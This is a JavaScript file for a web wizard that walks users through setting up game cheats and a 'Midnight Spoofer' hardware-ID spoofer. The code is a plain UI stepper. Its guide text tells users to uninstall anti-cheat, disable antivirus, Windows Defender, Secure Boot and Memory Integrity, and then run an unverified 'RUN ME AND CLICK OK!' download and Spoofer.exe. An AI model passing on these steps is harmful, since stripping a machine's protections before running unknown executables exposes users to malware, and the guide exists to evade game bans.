document.addEventListener("DOMContentLoaded", () => {
  const guides = {
    r6: { title: "R6 Siege - Crusader", steps: [] },
    valorant: { title: "Valorant - Internal", steps: [] },
    fortnite: { title: "Fortnite - Ultimate", steps: [] },
    bo6: { title: "Black Ops 6 - Advanced", steps: [] },
    midnight: {
      title: "Midnight Spoofer - Temp HWID",
      steps: [
        {
          title: "Remove Anti-Cheat Software",
          description: "Uninstall any anti-cheat software such as Riot Vanguard, BattleEye, or EasyAntiCheat.",
          instructions: [
            "Open Control Panel > Programs and Features.",
            "Locate and uninstall all anti-cheat software.",
            "Restart your PC after removal."
          ]
        },
        {
          title: "Disable All Antivirus Software",
          description: "Turn off or uninstall any third-party antivirus software.",
          instructions: [
            "Open your antivirus dashboard.",
            "Disable real-time protection and firewall.",
            "Uninstall if necessary for full compatibility."
          ]
        },
        {
          title: "Disable Windows Defender with DControl",
          description: "Use Defender Control to fully disable Windows Defender.",
          instructions: [
            "Download Defender Control from the Downloads tab.",
            "Run the tool and click 'Disable Defender'.",
            "Confirm Defender is disabled in Windows Security."
          ]
        },
        {
          title: "Disable Secure Boot",
          description: "Secure Boot must be disabled in BIOS.",
          instructions: [
            "Restart your PC and enter BIOS (usually by pressing DEL or F2).",
            "Navigate to Boot settings and disable Secure Boot.",
            "Save changes and exit BIOS."
          ]
        },
        {
          title: "Enable Virtualization",
          description: "Ensure virtualization is enabled for proper spoofing.",
          instructions: [
            "Enter BIOS and locate virtualization settings.",
            "Enable Intel VT-x or AMD-V.",
            "Save and exit BIOS."
          ]
        },
        {
          title: "Final Verification",
          description: "Confirm all previous steps are complete.",
          instructions: [
            "Check that antivirus and Defender are disabled.",
            "Ensure Secure Boot is off and virtualization is on.",
            "Proceed to the next step to run the program."
          ]
        },
        {
          title: "How to Run the Program",
          description: "Get the download from the Downloads tab and follow these steps.",
          instructions: [
            "Download the loader from the Downloads tab.",
            "Run 'RUN ME AND CLICK OK!' from https://drive.proton.me/urls/WG0PR01QK8#nPodTIdkIMGN.",
            "Follow the PC Prep guide (only exploit protection).",
            "Disable antivirus and Defender using DControl.",
            "Search 'Core Isolation' and turn off 'Memory Integrity'.",
            "Run the 'checker' program and save your serials.",
            "Restart your PC.",
            "Launch Spoofer.exe — a seed will be created automatically.",
            "Do NOT change seed unless banned or switching games.",
            "Avoid using a Windows PIN during SID spoofing.",
            "Explore spoof options when prompted — always hit '1' to enable.",
            "Avoid GPU spoofing for Fortnite tournaments.",
            "Always enable ARP spoofing.",
            "Use built-in cleaner for COD and Fortnite if needed.",
            "⚠️ Do NOT run cracking tools — this may wipe your drive!"
          ],
          warning: "Do NOT have a Windows password set when performing SID spoofing. It will lock you out and require a full reinstall."
        }
      ]
    }
  };

  const productCards = document.querySelectorAll(".product-card");
  const guideScreen = document.getElementById("guide-screen");
  const productSelection = document.getElementById("product-selection");
  const completionScreen = document.getElementById("completion-screen");
  const guideTitle = document.getElementById("guide-title");
  const progressText = document.getElementById("progress-text");
  const progressFill = document.getElementById("progress-fill");
  const stepNumber = document.getElementById("step-number");
  const stepTitle = document.getElementById("step-title");
  const stepDescription = document.getElementById("step-description");
  const instructionsList = document.getElementById("instructions-list");
  const stepWarning = document.getElementById("step-warning");
  const warningText = document.getElementById("warning-text");
  const validateBtn = document.getElementById("validate-btn");
  const nextBtn = document.getElementById("next-btn");
  const backBtn = document.getElementById("back-btn");
  const restartBtn = document.getElementById("restart-btn");
  const completedProduct = document.getElementById("completed-product");
  const completionSummary = document.getElementById("completion-summary");

  let currentProduct = null;
  let currentStep = 0;

  productCards.forEach(card => {
    card.addEventListener("click", () => {
      currentProduct = card.dataset.product;
      currentStep = 0;
      loadStep();
      productSelection.classList.remove("active");
      guideScreen.classList.add("active");
    });
  });

  backBtn.addEventListener("click", () => {
    guideScreen.classList.remove("active");
    productSelection.classList.add("active");
  });

  validateBtn.addEventListener("click", () => {
    currentStep++;
    const steps = guides[currentProduct].steps;
    if (currentStep < steps.length) {
      loadStep();
    } else {
      guideScreen.classList.remove("active");
      completionScreen.classList.add("active");
      completedProduct.textContent = guides[currentProduct].title;
      completionSummary.innerHTML = steps.map((step, i) => `<p><strong>Step ${i + 1}:</strong> ${step.title}</p>`).join("");
    }
  });

  restartBtn.addEventListener("click", () => {
    completionScreen.classList.remove("active");
    productSelection.classList.add("active");
  });

  function loadStep() {
    const steps = guides[currentProduct].steps;
    const step = steps[currentStep];
    guideTitle.textContent = guides[currentProduct].title;
    progressText.textContent = `Step ${currentStep + 1} of ${steps.length}`;
    progressFill.style.width = `${((currentStep + 1) / steps.length) * 100}%`;
    stepNumber.textContent = String(currentStep + 1).padStart(2, "0");
    stepTitle.textContent = step.title;
    stepDescription.textContent = step.description;
    instructionsList.innerHTML = step.instructions.map(i => `<li>${i}</li>`).join("");
    if (step.warning) {
      stepWarning.style.display = "block";
      warningText.textContent = step.warning;
    } else {
      stepWarning.style.display = "none";
    }
  }
});
